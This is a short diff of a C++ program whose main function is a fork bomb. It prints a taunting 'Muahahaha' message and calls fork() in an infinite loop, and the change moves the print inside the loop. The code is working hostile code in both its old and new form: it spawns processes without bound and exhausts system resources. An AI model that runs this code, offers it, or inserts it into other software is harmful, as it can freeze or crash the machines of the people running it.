@@ -8,9 +8,11 @@ using namespace std;
 
 int main(int argc, char* argv[])
 {
-	cout << "Muahahahahahahaha ..." << endl;
-	
-	while(true) fork();
-	
+	while(true) {
+		cout << "Muahahahahahahaha ..." << endl;
+
+		fork();
+	}
+
 	return 0;
 }
